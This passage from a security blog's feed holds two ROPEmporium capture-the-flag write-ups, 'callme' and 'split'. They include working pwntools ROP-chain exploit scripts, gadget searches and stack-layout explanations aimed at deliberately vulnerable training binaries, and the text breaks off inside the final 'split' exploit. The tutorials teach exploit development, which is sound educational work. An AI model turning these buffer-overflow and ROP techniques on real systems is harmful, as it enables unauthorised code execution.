    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;gdbscript&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'''
break *0x{exe.symbols.main:x}
continue
'''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;locals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;#Additionally, %rdi, %rsi, %rdx, %rcx, %r8, and %r9 are used to pass the first six integer or pointer parameters to called functions
#call callme_one(1,2,3)
#call callme_two(1,2,3)
#call callme_three(1,2,3)
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pop_rdi_rsi_rdx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00401ab0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#0x00401ab0: pop rdi; pop rsi; pop rdx; ret;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;one&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;two&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;three&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;parameters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pop_rdi_rsi_rdx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;one&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;two&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;three&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# -- Exploit goes here --
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parameters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;callme_one&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parameters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;callme_two&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parameters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;callme_three&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;gt; '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Flag: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;512&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2019/08/ropemporium-2-callme/image-16.png&quot; alt=&quot;Flag&quot; /&gt;&lt;/p&gt;

&lt;p&gt;GitHub: &lt;a href=&quot;https://github.com/Securitybits-io/ROPEmporium&quot;&gt;https://github.com/Securitybits-io/ROPEmporium&lt;/a&gt;&lt;/p&gt;</content><author><name>Christoffer Claesson</name></author><category term="exploit-dev" /><summary type="html">Continuing the ROP Series with Callme, this time going through Calling conventions</summary></entry><entry><title type="html">ROPEmporium: 1-Split (64-bit)</title><link href="/ropemporium-1-split" rel="alternate" type="text/html" title="ROPEmporium: 1-Split (64-bit)" /><published>2019-08-10T00:00:00+00:00</published><updated>2019-08-10T00:00:00+00:00</updated><id>/ropemporium-1-split</id><content type="html" xml:base="/ropemporium-1-split">&lt;blockquote&gt;
  &lt;p&gt;Doing a ROPEmporium Series, time to switch it up with Split!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Before you read any further go back and have a look on my previous &lt;a href=&quot;https://blog.securitybits.io/ropemporium-0-ret2win&quot;&gt;ROPEmporium&lt;/a&gt; post, as this post will build on that knowledge. But also have some familiarity of&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;GDB&lt;/li&gt;
  &lt;li&gt;Radare2&lt;/li&gt;
  &lt;li&gt;Assembly&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This round we’ll use the same tools as in 0-ret2win, with the addition to &lt;a href=&quot;https://github.com/sashs/Ropper&quot;&gt;Ropper&lt;/a&gt; as we have to find and use specific gadgets to make the 64-bit exploit.&lt;/p&gt;

&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;I’ll let you in on a secret; that useful string “/bin/cat flag.txt” is still present in this binary, as is a call to system(). It’s just a case of finding them and chaining them together to make the magic happen.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;setup&quot;&gt;Setup&lt;/h2&gt;

&lt;p&gt;Again lets download and do some initial analysis of the binary&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@linux:~/split# wget https://ropemporium.com/binary/split.zip
root@linux:~/split# unzip split.zip
root@linux:~/split# ls
flag.txt split split.zip
root@linux:~/split# file split
split: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8cbc19d1114b70bce2305f7ded9e7dd4d2e28069, not stripped
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Awesome, still not stripped and we downloaded the proper 64-bit ELF Executable. We can also execute it to look on the program execution flow and what input data it wants.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@Valkyrie:~/Documents/courses/ropemporium/1-split# ./split
split by ROP Emporium
64bits
Contriving a reason to ask user for data...
&amp;gt; inputdata
Exiting
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So the basic flow is similar to ret2win, no surprise there as this exercise is more looking at the assembly, but again the user is required to input data after the &lt;em&gt;”&amp;gt; “&lt;/em&gt;. Much like 0-Ret2Win the offset to our junk in order to control RIP is 40 bytes, and i am intentionally skipping the details in this step to focus more on the ROP Chain.&lt;/p&gt;

&lt;p&gt;So again create the exploit template using pwntools&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@Valkyrie:~/Documents/courses/ropemporium/1-split# \
&amp;gt; pwn template --host 127.0.0.1 --port 31337 split --quiet &amp;gt; exploit.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And again keeping with the standard, adding the 40-byte junk and payload definition&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...snip...]
# -- Exploit goes here --
junk = 'A'*40

payload = &quot;&quot;
payload += junk

io = start()
io.recvuntil('&amp;gt; ')
io.sendline(payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So lets start reversing the binary and look for the gadgets that we have to use.&lt;/p&gt;

&lt;h2 id=&quot;radare2-reversing&quot;&gt;Radare2 Reversing&lt;/h2&gt;

&lt;p&gt;Analyzing the binary first with rabin2, to have a look on its protections we can see that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nx: true&lt;/code&gt; also that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stripped: false&lt;/code&gt; . So again a ROP Chain is the key to success!&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@Valkyrie:~/Documents/courses/ropemporium/1-split# rabin2 -I split
arch x86
baddr 0x400000
binsz 7137
bintype elf
bits 64
canary false
class ELF64
compiler GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
crypto false
endian little
havecode true
intrp /lib64/ld-linux-x86-64.so.2
laddr 0x0
lang c
linenum true
lsyms true
machine AMD x86-64 architecture
maxopsz 16
minopsz 1
nx true
os linux
pcalign 0
pic false
relocs true
relro partial
rpath NONE
sanitiz false
static false
stripped false
subsys linux
va true
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;So lets open the binary in Radare2 and look for our ROP Chain.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2019/08/ropemporium-1-split/image-8.png&quot; alt=&quot;Radare2 Reversing&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So in the challenge description we got the hint that there are still a useful function, but also a useful string which have been split apart! Investigating both the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sym.usefulFunction&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;obj.usefulString&lt;/code&gt; we can slowly see the parts that we have to use in order to print the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.txt&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2019/08/ropemporium-1-split/image-9.png&quot; alt=&quot;Radare2 Symbols and useful functions&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Above is the function in 1-split that contains the gadget system, but it’s also apparent that it wont print us the flag by simply calling the function. Since the edi will be filled with the pointer to the string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;str.bin_ls&lt;/code&gt; (/bin/ls) and will thus only print out the files in the current directory. While this proves code execution or command injection… doesn’t help us getting that flag! What we really want is to call the obj.usefulString as an argument to system&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2019/08/ropemporium-1-split/image-10.png&quot; alt=&quot;Radare2 Strings&quot; /&gt;&lt;/p&gt;

&lt;p&gt;That will certainly print us the flag. But the next question is…. how can we change the calling string to system if it is hard coded into the binary?&lt;/p&gt;

&lt;h3 id=&quot;anatomy-of-a-rop-chain&quot;&gt;Anatomy of a ROP Chain&lt;/h3&gt;

&lt;p&gt;Now in order to dig a little into the calling convention of system calls in Linux we have to consult the ever exiting man page. Running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;man system&lt;/code&gt; in a terminal we are presented the manual for the library function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system()&lt;/code&gt;.  &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2019/08/ropemporium-1-split/image-11.png&quot; alt=&quot;manpage of system()&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we have a brief look into the description of the system call, we can identify that the calling convention is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system(&amp;lt;string of what to be executed&amp;gt;)&lt;/code&gt; , so the first parameter is the command to run. Which follows the principle in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sym.usefulFunction&lt;/code&gt; as the string before system is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/ls&lt;/code&gt;. Which in turn is placed in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;edi&lt;/code&gt; register just before the call to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system()&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sym.usefulFunction ();
0x0040080b bfff084000 mov edi, str.bin_ls ;0x4008ff ; &quot;/bin/ls&quot; ; const char *string
0x00400810 e8cbfdffff call sym.imp.system ;int system(const char *string)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now there’s a really good paper &lt;a href=&quot;https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf&quot;&gt;x64-Cheatsheet.pdf&lt;/a&gt; which explains a lot of the calls and methods in 64-bit assembly. A direct quote in the paper states that&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;4.3 Register Usage&lt;br /&gt;
Additionally, %rdi, %rsi, %rdx, %rcx, %r8, and %r9 are used to pass the first six integer or pointer parameters to called functions. Additional parameters (or large parameters such as structs passed by value) are passed on the stack.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Which means that it should look something like:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;+-----------------------------------------------------------+
| Call      First   Second  Third   Fourth  Fifth   Sixth   |
| System()  %rdi    %rsi    %rdx    %rcx    %r8     %r9     |
+-----------------------------------------------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we know that we need to move &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;obj.usefulString&lt;/code&gt; into the first argument before calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system()&lt;/code&gt;, which should correlate to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%RDI Register&lt;/code&gt;, And there are three basic ways to achieve this and move data around in assembly:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;push - push register onto top of stack&lt;/li&gt;
  &lt;li&gt;pop - pop top of stack onto register&lt;/li&gt;
  &lt;li&gt;mov - move source to destination&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;But scrolling through the radare2 assembly can be a bit tedious, and there are a search function in radare2 to look for gadgets and specific calls, but its time to introduce ropper which will automagically find all the gadgets available to us in the binary or a glibc (though not necessary in the ROPEmporium challenges). So hunting for gadgets can be a bit tricky, as it usually requires to have a bunch of information and make assumptions as you go. luckily for us this time we only need one gadget this time, a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@Valkyrie:~/Documents/courses/ropemporium/1-split# ropper -f split
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
Gadgets
=======
[...snip...]
0x00000000004006b0: pop rbp; ret;
0x0000000000400883: pop rdi; ret;
0x0000000000400881: pop rsi; pop r15; ret;
[...snip...]
91 gadgets found
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ropper identified that on address &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00400883&lt;/code&gt; theres a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi; ret&lt;/code&gt;, which is easily verified in radare2 with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pdi 2 @ 0x00400883&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2019/08/ropemporium-1-split/image-12.png&quot; alt=&quot;pop rdi instruction&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;constructing-the-rop-chain&quot;&gt;Constructing the ROP Chain&lt;/h3&gt;

&lt;p&gt;Now that we’ve identified the 3 parts we need in order to print the flag, its due time to start the assembly (No pun intended). This is something that we have to do in a specific order, which is more important in the later challenges but easier to understand now.&lt;/p&gt;

&lt;p&gt;In order to call system with the string, we need to place the string into the RDI register before the system call. And since the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi&lt;/code&gt; takes the &lt;em&gt;next stack address&lt;/em&gt; and pops it into the register, the pop call needs to be right before the string address. so the chain have to look something like this&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[junk] + [pop rdi] + [usefulString] + [system]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Which is easily constructed in our exploit code, now that we have all the parts needed.&lt;/p&gt;

&lt;h2 id=&quot;split&quot;&gt;Split&lt;/h2&gt;

&lt;p&gt;This time we’ll go straight to pwntools, but you can substitute the names for binary addresses if you want. So the different parts we need just to reiterate are&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Junk - which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;'A'*40&lt;/code&gt; in order to control RIP and execute our own addresses&lt;/li&gt;
  &lt;li&gt;usefulString - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exe.symbols.usefulString&lt;/code&gt; the address to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/cat flag.txt&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;System() - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exe.symbols.system&lt;/code&gt; to create the system call&lt;/li&gt;
  &lt;li&gt;pop rdi - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00400883&lt;/code&gt; to put the next stack address onto the proper register&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;And in the final exploit we’ll use pwntools function p64(address) in order to convert a memory address into a packed string.&lt;/p&gt;

&lt;h3 id=&quot;final-exploit&quot;&gt;Final Exploit&lt;/h3&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#Author: Christoffer.Claesson@Securitybits.io
#Blog: https://blog.securitybits.io/2019/08/10/ropemporium-1-split-64-bit/
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python2
# -*- coding: utf-8 -*-
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'split'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HOST&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'127.0.0.1'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;31337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;local&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'''Execute the target binary locally'''&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GDB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gdbscript&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gdbscript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
